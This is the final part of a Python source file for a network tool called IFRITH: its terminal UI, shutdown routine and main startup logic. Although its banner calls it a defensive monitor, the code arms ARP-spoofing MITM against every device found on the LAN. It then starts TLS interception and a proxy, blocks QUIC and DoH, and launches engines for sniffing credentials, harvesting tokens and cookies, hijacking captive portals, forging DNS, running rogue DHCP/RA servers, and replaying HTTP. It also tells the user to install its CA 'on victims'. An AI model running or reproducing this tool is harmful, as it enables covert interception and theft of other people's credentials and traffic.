    "MODULES", "CONTROL_SOCK",
    "NUD_PIN", "SNI_DEFRAG", "RECORD_ALIGN", "ISN_PRESERVE",
    "TTL_MIRROR", "WINDOW_MIRROR", "FORWARDER",
    "FLOW_SHAPE", "KALMAN_ARP", "TTL_MANIP", "NAT_HIJACK",
    "DHCP4", "DHCP6", "RA", "NDP",
    "SMB_MSG", "MDNS_RENAME", "REPLAY",
    "EVENTS", "ALERTS", "CAPTURE",
    "CONTROL", "REPORT", "ARP_TABLE",
    "TESTHARNESS",
]

def _render_row(name):
    fn = PANEL_FUNCS.get(name)
    if not fn:
        return Panel(f"[dim]{name}: no panel[/]", border_style="dim")
    return _panel_cached(name, fn)

_KEY_QUEUE = queue.Queue(maxsize=64)
_KEY_THREAD_STOP = threading.Event()

def _key_reader_thread():
    try:
        import termios, tty
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
    except Exception:
        return
    try:
        tty.setcbreak(fd)
        while not _KEY_THREAD_STOP.is_set():
            try:
                r, _, _ = select.select([sys.stdin], [], [], 0.1)
                if not r: continue
                ch = sys.stdin.read(1)
                if not ch: continue
                if ch == "\x1b":
                    r2, _, _ = select.select([sys.stdin], [], [], 0.05)
                    seq = ""
                    if r2:
                        seq = sys.stdin.read(2)
                    try: _KEY_QUEUE.put_nowait(ch + seq)
                    except queue.Full: pass
                else:
                    try: _KEY_QUEUE.put_nowait(ch)
                    except queue.Full: pass
            except Exception:
                time.sleep(0.1)
    finally:
        try: termios.tcsetattr(fd, termios.TCSADRAIN, old)
        except Exception: pass

def _print_title():
    console.print(Align.center(Text(ASCII_ART, style="bold bright_red")))
    console.print(Align.center(
        f"[bold bright_red]{TOOL_NAME}[/]  [dim]—[/]  "
        f"[bold bright_red]{TOOL_TITLE}[/]"))
    console.print(Align.center(
        f"[dim]Author:[/] [bold bright_red]{TOOL_AUTHOR}[/]"))
    console.print(Align.center(
        "[dim]Defensive LAN monitor for your own Wi-Fi only.[/]"))
    console.print()

def ui_loop():
    try:
        import termios, tty
        fd = sys.stdin.fileno()
        old_term = termios.tcgetattr(fd)
    except Exception:
        old_term = None
    def restore():
        if old_term is not None:
            try:
                import termios
                termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN,
                                   old_term)
            except Exception: pass
    atexit.register(restore)
    _KEY_THREAD_STOP.clear()
    threading.Thread(target=_key_reader_thread, daemon=True).start()

    sys.stdout.write("\033[?25l"); sys.stdout.flush()

    term_h = _term_height()
    overhead = 22
    per_page = max(3, term_h - overhead)
    names = ROWS_ORDER
    scroll = 0

    def build():
        nonlocal scroll
        visible = names[scroll:scroll + per_page]
        layout = Layout()
        layout.split_column(*[Layout(name=f"row{i}",
                                     size=11 if i == 0 else 9)
                              for i in range(len(visible))])
        for i, name in enumerate(visible):
            layout[f"row{i}"].update(_render_row(name))
        return layout

    refresh = max(1.0, float(CONFIG.get("ui_refresh_hz", 2.0)))
    refresh_per_sec = max(1, int(refresh))
    with Live(build(), refresh_per_second=refresh_per_sec, screen=True) as live:
        while STATE.running:
            live.update(build())
            deadline = time.time() + 1.0 / refresh
            while time.time() < deadline:
                try: ch = _KEY_QUEUE.get(timeout=0.05)
                except queue.Empty: continue
                if ch in ("q",):
                    _full_clean_exit(0)
                elif ch == "\x18":
                    _full_clean_exit(0)
                elif ch == "\x1b[A" or ch == "k":
                    scroll = max(0, scroll - 1)
                elif ch == "\x1b[B" or ch == "j":
                    scroll = min(max(0, len(names) - per_page), scroll + 1)
                elif ch == "\x1b[5" or ch == "K" or ch == "\x1b[5~":
                    scroll = max(0, scroll - per_page)
                elif ch == "\x1b[6" or ch == "J" or ch == "\x1b[6~":
                    scroll = min(max(0, len(names) - per_page),
                                 scroll + per_page)
                elif ch == "\x1b[H" or ch == "g" or ch == "\x1b[1~":
                    scroll = 0
                elif ch == "\x1b[F" or ch == "G" or ch == "\x1b[4~":
                    scroll = max(0, len(names) - per_page)
    _KEY_THREAD_STOP.set()
    try: sys.stdout.write("\033[?25h"); sys.stdout.flush()
    except Exception: pass

_shutdown = {"done": False}

def _restore_environment():
    try:
        if MITM_PROXY and getattr(MITM_PROXY, "running", False):
            try: MITM_PROXY.stop()
            except Exception: pass
        if MITM_ENGINE and getattr(MITM_ENGINE, "running", False):
            try: MITM_ENGINE.stop()
            except Exception: pass
        if FORWARDER and getattr(FORWARDER, "running", False):
            try: FORWARDER.stop()
            except Exception: pass
        if NUD_PIN:
            try: NUD_PIN.stop()
            except Exception: pass
        if QUIC_DOWNGRADE:
            try: QUIC_DOWNGRADE.stop()
            except Exception: pass
        try:
            iface = CONFIG.get("iface")
            if iface:
                sh(f"iptables -D FORWARD -i {iface} -o {iface} -j ACCEPT "
                   f"2>/dev/null")
        except Exception: pass
        if KERNEL_SNAP:
            try: KERNEL_SNAP.restore()
            except Exception: pass
    except Exception: pass

def _full_clean_exit(code=0):
    if _shutdown["done"]: return
    _shutdown["done"] = True
    STATE.running = False
    try: _KEY_THREAD_STOP.set()
    except Exception: pass
    try: _restore_environment()
    except Exception: pass
    try: sys.stdout.write("\033[?25h")
    except Exception: pass
    try: sys.stdout.write("\033[?1049l")
    except Exception: pass
    try: sys.stdout.flush()
    except Exception: pass

    engines = [
        MITM_PROXY, MITM_ENGINE, FORWARDER,
        JA4_ENGINE, DNS_FORGE, TLS_TERM,
        PORTAL, GUARD_MON, CAPTURE,
        TLS_HIJACK, TCP_FORK, H2_HPACK, WS_SPLICE,
        ECH_DOWNGRADE, QUIC_DOWNGRADE, CT_RANKER, BASELINE,
        MODULE_REG, CONTROL_SOCK, NUD_PIN, SNI_DEFRAG,
        RECORD_ALIGN, ISN_PRESERVE, TTL_MIRROR, HTTP_PARSER,
        CRED_SNIFF, TOKEN_HARVEST, CAPTIVE_HIJACK, SEARCH_SPOOF,
        CORRELATOR, TESTHARNESS,
        DHCP4_SERVER, DHCP6_SERVER, RA_SERVER, NDP_SERVER,
        SMB_MSG, MDNS_RENAME, REPLAY_ENGINE,
        COOKIE_JAR, JWT_WATCHER, PROTO_CREDS,
        FLOW_SHAPER, KALMAN_ARP, TTL_MANIP,
        NAT_HIJACK, CROSS_APP_CORR, BEHAVIOR_TIMING, REFRESH_WATCH,
        PSK_BINDER, WS_CTRL, ECH_OUTER, TLS_DRIFT, QUIC_CONNID,
        H2_PUSH, QUIC_RETRY, PROBE_FP, BSSID_TRACE, WIFIDIRECT,
        ROUTER_FP, RULE_ENGINE, POLICY_MGR, SIGNED_LOG,
        SQL_STATE, LIVE_MIRROR, JA4S_FID, COOKIE_GRAPH,
        DNS_CHAN_EST, PCAP_ROTATE, DNSBL_ENGINE,
    ]
    for eng in engines:
        try:
            if eng and hasattr(eng, "stop"): eng.stop()
        except Exception: pass

    if STATE.db is not None:
        try: STATE.db.close()
        except Exception: pass

    try: write_outputs()
    except Exception: pass
    try:
        if CAPTURE: CAPTURE.dump()
    except Exception: pass
    try:
        if os.path.exists(CONFIG["control_socket"]):
            os.unlink(CONFIG["control_socket"])
    except Exception: pass
    try:
        if os.path.exists(CONFIG["mirror_socket"]):
            os.unlink(CONFIG["mirror_socket"])
    except Exception: pass
    try: _SPLASH.stop()
    except Exception: pass
    os._exit(code)

def on_sigint(sig, frame):  _full_clean_exit(0)
def on_sigterm(sig, frame): _full_clean_exit(0)
def on_sighup(sig, frame):  _full_clean_exit(0)

def _load_all_data_files():
    _SPLASH.set_status("LOADING OUI DATABASE")
    _load_oui()
    _SPLASH.set_status("LOADING DHCP FINGERPRINTS")
    _load_dhcp_fp()
    _SPLASH.set_status("LOADING JA3 DATABASE")
    _load_ja3_db()
    _SPLASH.set_status("LOADING USER-AGENT PROFILES")
    _load_ua_db()
    _SPLASH.set_status("ARMING DNSBL MATRIX")
    _load_dnsbl()
    global JA3_HINTS
    JA3_HINTS = {}
    for _h, (_l, _c) in _JA3_DB.items():
        JA3_HINTS[_h] = _l

def _choose_proxy_mode():
    console.rule(f"[bold bright_red]{TOOL_NAME} — MITM Proxy Mode[/]")
    t = Table(expand=True)
    t.add_column("#", width=3); t.add_column("Mode", width=10)
    t.add_column("Description", ratio=5)
    t.add_row("1", "[dim]A[/] Off",
              "passive only, no MITM, no proxy")
    t.add_row("2", "[cyan]B[/]",
              "MITM + proxy (HTTP+HTTPS redirect, no QUIC/DoH block)")
    t.add_row("3", "[green]C[/]",
              "MITM + proxy + QUIC block + DoH block  "
              "[bold](default)[/]")
    t.add_row("4", "[magenta]N[/]",
              "mitm only, no proxy (ARP poison, no TLS intercept)")
    console.print(t)
    ans = Prompt.ask("[bold]Choose mode [1-4, default=3][/]",
                     default="3").strip()
    if ans == "1": return "A"
    if ans == "2": return "B"
    if ans == "4": return "N"
    return "C"

def _full_main():
    args = _parse_args()
    if not args.no_splash and sys.stdout.isatty():
        _SPLASH.start()
        _SPLASH.set_status("BOOTING IFRITH")
    if args.iface: CONFIG["iface"] = args.iface
    if args.gateway: CONFIG["gateway_ip"] = args.gateway
    if args.debug: CONFIG["debug"] = True
    if args.no_ja4: CONFIG["ja4_enabled"] = False
    if args.no_tshark:
        CONFIG["tshark_enabled"] = False
    if args.no_mitm:
        CONFIG["mitm_enabled"] = False
        CONFIG["mitm_mode"] = "A"
    if args.no_proxy:
        CONFIG["proxy_nat_http"] = False
        CONFIG["proxy_nat_https"] = False
    if args.no_tls_term:
        CONFIG["tls_terminate_enabled"] = False
    if args.mitm_mode:
        CONFIG["mitm_mode"] = args.mitm_mode

    _load_all_data_files()

    _SPLASH.set_status("PRIVILEGE CHECK")
    if os.geteuid() != 0:
        _SPLASH.stop()
        console.print("[red]IFRITH must run as root:[/] sudo python ifrith.py")
        sys.exit(1)

    _SPLASH.stop()

    _print_title()

    if _DNSBL:
        console.print(Panel(
            f"[green]DNSBL whitelist loaded:[/] [bold]{len(_DNSBL)}[/] "
            f"sensitive domains\n"
            f"[dim]Traffic to any of these will be detected and tracked "
            f"per-device.[/]",
            border_style="magenta", title="IFRITH — DNSBL"))
    if _OUI_VENDORS:
        console.print(f"[green]OUI database:[/] {len(_OUI_VENDORS)} "
                       f"vendor prefixes")
    if _JA3_DB:
        console.print(f"[green]JA3 database:[/] {len(_JA3_DB)} fingerprints")
    if _UA_DB["browsers"]:
        console.print(f"[green]User-Agent DB:[/] "
                       f"{len(_UA_DB['browsers'])} browser profiles")
    if _DHCP_FP:
        console.print(f"[green]DHCP fingerprints:[/] {len(_DHCP_FP)} entries")

    iface = "wlan0"
    CONFIG["iface"] = iface
    if not os.path.exists(f"/sys/class/net/{iface}"):
        console.print(f"[red]IFRITH: interface {iface} not found[/]")
        sys.exit(1)

    if args.scan_only:
        aps = _list_aps()
        if not aps:
            console.print(Panel(f"[red]No APs found on {iface}.[/]\n\n"
                f"[bold]Reason:[/] {_diagnose_scan_failure()}",
                border_style="red", title="IFRITH — Scan only"))
        else:
            _render_ap_table(aps, "IFRITH — Scan only")
        sys.exit(0)

    if not _startup_network_choice():
        console.print("[red]IFRITH: no network selected. Exiting.[/]")
        sys.exit(0)

    with console.status(f"[cyan]IFRITH reading network info on {iface}...[/]"):
        wifi = get_wifi_info(iface)
    CONFIG.update(wifi)

    console.print(
        f"[green]Interface:[/] [bold]{CONFIG['iface']}[/]   "
        f"[cyan]SSID:[/] {CONFIG.get('ssid') or '—'}   "
        f"[green]You:[/] {CONFIG.get('my_ip') or '—'}"
    )
    if CONFIG.get("monitor_mode"):
        console.print("[yellow]Monitor mode detected — subnet filter "
                       "disabled[/]")
    if not CONFIG.get("my_ip") and not CONFIG.get("monitor_mode"):
        console.print("[red]IFRITH: no IPv4 address on this interface.[/]")
        sys.exit(1)

    console.rule(f"[bold bright_red]{TOOL_NAME} — Gateway[/]")
    if not _gateway_selection_flow():
        console.print("[red]IFRITH: no gateway selected. Exiting.[/]")
        sys.exit(0)
    console.print(f"[green]Using gateway:[/] [bold cyan]"
                   f"{CONFIG['gateway_ip']}[/] "
                   f"({CONFIG.get('gateway_mac') or 'MAC unknown'})")

    _post_gateway_dnsbl_loading()

    global JA4_TESTDATA
    JA4_TESTDATA = _resolve_testdata_dir()

    my_ip = CONFIG.get("my_ip") or "0.0.0.0"
    try:
        net = ipaddress.IPv4Network(f"{my_ip}/{CONFIG['netmask']}",
                                     strict=False)
        subnet_cidr = str(net)
    except Exception:
        subnet_cidr = f"{my_ip}/24"

    console.rule(f"[bold bright_red]{TOOL_NAME} — Discovery[/]")
    found = discover_devices(CONFIG["iface"], subnet_cidr)

    with STATE.lock:
        for ip, meta in found.items():
            if ip in RESOLVER_IPS: continue
            STATE.devices[ip] = Device(ip, mac=meta.get("mac"),
                                        vendor=meta.get("vendor"))
            if meta.get("mac") and meta["mac"] != "?":
                _register_mac(ip, meta["mac"])
    if CONFIG.get("my_ip"):
        touch_device(CONFIG["my_ip"], CONFIG.get("my_mac"))
    if CONFIG.get("gateway_ip"):
        touch_device(CONFIG["gateway_ip"], CONFIG.get("gateway_mac"))

    with console.status("[cyan]IFRITH resolving hostnames...[/]"):
        resolve_hostnames(found)
        with STATE.lock:
            for ip, meta in found.items():
                if meta.get("hostname") and ip in STATE.devices:
                    STATE.devices[ip].hostname = meta["hostname"]

    real = _count_real_devices()
    def _key(d):
        if _is_me(d.ip): return (0, -d.bytes)
        if _is_gw(d.ip): return (1, -d.bytes)
        return (2, -d.bytes)
    real.sort(key=_key)

    t = Table(title=f"[bold bright_red]{TOOL_NAME}[/] "
                    f"LAN inventory ({len(real)})")
    t.add_column("Role"); t.add_column("IP"); t.add_column("MAC")
    t.add_column("Vendor")
    for d in real:
        t.add_row(role_of(d.ip), d.ip, d.mac, d.vendor)
    console.print(t)

    mitm_possible = bool(CONFIG.get("gateway_mac"))
    if mitm_possible and not args.no_mitm:
        mitm_choice = Confirm.ask(
            "[bold red]IFRITH: enable full-duplex ARP-spoof MITM?[/]\n"
            "[dim]Traffic from every poisoned device flows through YOU in "
            "BOTH directions. Only on networks you own.[/]",
            default=False)
    else:
        if not mitm_possible:
            console.print("[yellow]IFRITH: gateway MAC unknown — "
                          "MITM unavailable.[/]")
        mitm_choice = False

    proxy_mode = "C"
    if args.mitm_mode:
        proxy_mode = args.mitm_mode
    elif not args.no_proxy and mitm_possible and mitm_choice:
        proxy_mode = _choose_proxy_mode()
    elif not mitm_choice:
        proxy_mode = "A"

    if proxy_mode in ("B", "C") and not mitm_choice:
        console.print(Panel(
            "[yellow]Proxy requires MITM to be enabled to poison victims. "
            "Enable ARP MITM or choose mode A/N.[/]",
            border_style="yellow"))

    if not Confirm.ask("Start IFRITH live monitoring?", default=True):
        sys.exit(0)

    console.rule(f"[bold bright_red]{TOOL_NAME} — Capture[/]")
    global CAPTURE, MITM_ENGINE, JA4_ENGINE, DNS_FORGE, TLS_TERM
    global PORTAL, GUARD_MON, HTTP_PARSER, CRED_SNIFF, TOKEN_HARVEST
    global CAPTIVE_HIJACK, SEARCH_SPOOF, CORRELATOR, TESTHARNESS
    global DHCP4_SERVER, DHCP6_SERVER, RA_SERVER, NDP_SERVER
    global SMB_MSG, MDNS_RENAME, REPLAY_ENGINE
    global COOKIE_JAR, JWT_WATCHER, PROTO_CREDS
    global TLS_HIJACK, TCP_FORK, H2_HPACK, WS_SPLICE, ECH_DOWNGRADE
    global QUIC_DOWNGRADE, CT_RANKER, BASELINE, MODULE_REG, CONTROL_SOCK
    global NUD_PIN, SNI_DEFRAG, RECORD_ALIGN, ISN_PRESERVE, TTL_MIRROR
    global INTENT_MGR

    CAPTURE = Capture(CONFIG["iface"], ring_size=CONFIG["ring_size"])
    if not CAPTURE.start():
        console.print("[red]IFRITH cannot open raw socket. Root?[/]")
        sys.exit(1)

    signal.signal(signal.SIGINT, on_sigint)
    signal.signal(signal.SIGTERM, on_sigterm)
    try: signal.signal(signal.SIGHUP, on_sighup)
    except Exception: pass

    threading.Thread(target=CAPTURE.loop, daemon=True).start()

    if mitm_choice and mitm_possible:
        targets = [(d.ip, d.mac) for d in real
                   if not _is_me(d.ip) and not _is_gw(d.ip)
                   and d.mac and d.mac != "?"]
        console.print(f"[yellow]IFRITH MITM: arming {len(targets)} "
                       f"targets…[/]")
        MITM_ENGINE = MITM(CONFIG["iface"], CONFIG["my_ip"],
                            CONFIG["my_mac"],
                            CONFIG["gateway_ip"], CONFIG["gateway_mac"])
        MITM_ENGINE.add_targets(targets)
        if not MITM_ENGINE.start():
            console.print("[red]IFRITH MITM failed; continuing CLIENT "
                           "mode[/]")
            MITM_ENGINE = None

    if CONFIG.get("dns_forge_enabled"):
        DNS_FORGE = DNSSurface(CONFIG["iface"], CONFIG["my_ip"],
                                CONFIG["my_mac"])
        DNS_FORGE.add_rule("*.ifrith-lab.test", None, "wildcard")
        DNS_FORGE.start()

    if CONFIG.get("tls_terminate_enabled"):
        TLS_TERM = TLSIntercept(CONFIG["auto_ca_dir"])
        TLS_TERM.start()

    if CONFIG.get("portal_enabled"):
        PORTAL = HTTPServer(CONFIG["portal_host"], CONFIG["portal_port"])
        PORTAL.start()

    if CONFIG.get("guard_detect_enabled"):
        GUARD_MON = GuardMonitor(CONFIG["iface"]); GUARD_MON.start()

    if CONFIG.get("tls_hijack_enabled"):
        TLS_HIJACK = TLSHijackEngine(); TLS_HIJACK.start()
    if CONFIG.get("tcp_fork_enabled"):
        TCP_FORK = TCPForkEngine(); TCP_FORK.start()
    if CONFIG.get("h2_hpack_enabled"):
        H2_HPACK = H2HPACKEngine(); H2_HPACK.start()
    if CONFIG.get("ws_splice_enabled"):
        WS_SPLICE = WSSpliceEngine(); WS_SPLICE.start()
    if CONFIG.get("ech_downgrade_enabled"):
        ECH_DOWNGRADE = ECHDowngradeEngine(); ECH_DOWNGRADE.start()
    if CONFIG.get("quic_downgrade_enabled"):
        QUIC_DOWNGRADE = QUICDowngradeEngine(); QUIC_DOWNGRADE.start()
    if CONFIG.get("ct_ranker_enabled"):
        CT_RANKER = CTRankerEngine(); CT_RANKER.start()
    if CONFIG.get("baseline_enabled"):
        BASELINE = BaselineEngine(); BASELINE.start()
    if CONFIG.get("modules_enabled"):
        MODULE_REG = ModuleRegistry(); MODULE_REG.start()
    if CONFIG.get("control_sock_enabled"):
        CONTROL_SOCK = ControlSocket(); CONTROL_SOCK.start()

    if CONFIG.get("nud_pin_enabled"):
        NUD_PIN = NUDPinEngine(CONFIG["iface"], CONFIG["my_mac"])
        NUD_PIN.start()
        for d in real:
            if d.mac and MAC_RE.match(d.mac): NUD_PIN.add(d.ip, d.mac)
    if CONFIG.get("sni_defrag_enabled"):
        SNI_DEFRAG = SNIDefragEngine(); SNI_DEFRAG.start()
    if CONFIG.get("record_align_enabled"):
        RECORD_ALIGN = RecordAlignEngine(); RECORD_ALIGN.start()
    if CONFIG.get("isn_preserve_enabled"):
        ISN_PRESERVE = ISNPreserveEngine(); ISN_PRESERVE.start()
    if CONFIG.get("ttl_mirror_enabled"):
        TTL_MIRROR = TTLWindowMirrorEngine(); TTL_MIRROR.start()

    if CONFIG.get("http_body_capture_enabled"):
        HTTP_PARSER = HTTPParser(); HTTP_PARSER.start()
    if CONFIG.get("cred_sniff_enabled"):
        CRED_SNIFF = CredSniffer(); CRED_SNIFF.start()
        PROTO_CREDS = ProtoCredParser(); PROTO_CREDS.start()
    if CONFIG.get("token_harvest_enabled"):
        TOKEN_HARVEST = TokenHarvester(); TOKEN_HARVEST.start()
    if CONFIG.get("cookie_jar_enabled"):
        COOKIE_JAR = CookieJarEngine(); COOKIE_JAR.start()
    if CONFIG.get("jwt_decode_enabled"):
        JWT_WATCHER = JWTWatcher(); JWT_WATCHER.start()
    if CONFIG.get("captive_hijack_enabled"):
        CAPTIVE_HIJACK = CaptiveHijack(CONFIG["portal_port"])
        CAPTIVE_HIJACK.start()
    if CONFIG.get("search_spoof_enabled"):
        SEARCH_SPOOF = SearchSpoof(); SEARCH_SPOOF.start()
    if CONFIG.get("cross_device_enabled"):
        CORRELATOR = Correlator(); CORRELATOR.start()

    if CONFIG.get("dhcpv4_enabled"):
        DHCP4_SERVER = DHCPv4Server(CONFIG["iface"], CONFIG["my_ip"],
                                     CONFIG["my_mac"])
        DHCP4_SERVER.start()
    if CONFIG.get("dhcpv6_enabled"):
        DHCP6_SERVER = DHCPv6Server(CONFIG["iface"], CONFIG["my_ip"],
                                     CONFIG["my_mac"])
        DHCP6_SERVER.start()
    if CONFIG.get("ra_enabled"):
        RA_SERVER = RAServer(CONFIG["iface"], CONFIG["my_ip"],
                              CONFIG["my_mac"])
        RA_SERVER.start()
    if CONFIG.get("ndp_enabled"):
        NDP_SERVER = NDPServer(CONFIG["iface"], CONFIG["my_ip"],
                                CONFIG["my_mac"])
        NDP_SERVER.start()
        for d in real:
            if (not _is_me(d.ip) and not _is_gw(d.ip)
                and d.mac and d.mac != "?"):
                NDP_SERVER.add(d.ip, d.mac)
    if CONFIG.get("smb_msg_enabled"):
        SMB_MSG = SMBMsg(CONFIG["iface"], CONFIG["my_ip"],
                          CONFIG["my_mac"])
        SMB_MSG.start()
    if CONFIG.get("mdns_rename_enabled"):
        MDNS_RENAME = MDNSRename(CONFIG["iface"], CONFIG["my_ip"],
                                  CONFIG["my_mac"])
        MDNS_RENAME.start()
    if CONFIG.get("http_replay_enabled"):
        REPLAY_ENGINE = ReplayEngine(); REPLAY_ENGINE.start()

    if CONFIG.get("ja4_enabled", True):
        JA4_ENGINE = JA4Engine()
        if not JA4_ENGINE.start(CONFIG["iface"], _ja4_on_fp,
                                testdata_dir=JA4_TESTDATA,
                                verbose=CONFIG.get("ja4_verbose", True)):
            JA4_ENGINE = None

    try:
        _wire_part2_engines(real, mitm_choice, mitm_possible, proxy_mode)
    except Exception as e:
        console.print(f"[yellow]Part 2 wiring error: {e}[/]")

    TESTHARNESS = TestHarness(JA4_TESTDATA); TESTHARNESS.start()
    INTENT_MGR = IntentManager(); INTENT_MGR.start()

    if SQL_STATE and args.sql:
        rows = SQL_STATE.run(args.sql)
        if rows is not None:
            for r in rows: console.print(r)
        sys.exit(0)

    db = DB(CONFIG["db_file"]); STATE.db = db
    threading.Thread(target=db_loop, args=(db,), daemon=True).start()

    console.rule(f"[bold bright_red]{TOOL_NAME} — Live Analysis[/]")
    console.print("[dim]Controls: ↑/↓ j/k · J/K · g/G · q/Ctrl+X exit[/]")
    if MITM_PROXY and MITM_PROXY.running:
        console.print(Panel(
            f"[green]MITM proxy active[/]\n"
            f"HTTP  :0.0.0.0:{MITM_PROXY.http_port}  "
            f"(NAT redirect from :80)\n"
            f"HTTPS :0.0.0.0:{MITM_PROXY.https_port}  "
            f"(NAT redirect from :443)\n"
            f"QUIC block: "
            f"{'on' if CONFIG.get('mitm_quic_block') else 'off'}  "
            f"DoH block: "
            f"{'on' if CONFIG.get('mitm_doh_block') else 'off'}\n"
            f"CA cert (install on victims): "
            f"[bold]{MITM_PROXY._ca_cert}[/]\n"
            f"[dim]Victims must trust this CA for HTTPS decryption to work. "
            f"Pinned apps will fail loudly — that is expected.[/]",
            border_style="magenta", title="IFRITH — MITM PROXY"))
    time.sleep(1.0)
    try:
        ui_loop()
    except KeyboardInterrupt: pass
    except Exception:
        console.print("[red]IFRITH UI crashed:[/]")
        traceback.print_exc()
    finally:
        _full_clean_exit(0)

main = _full_main

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: _full_clean_exit(0)
    except Exception:
        traceback.print_exc()
        _full_clean_exit(1)


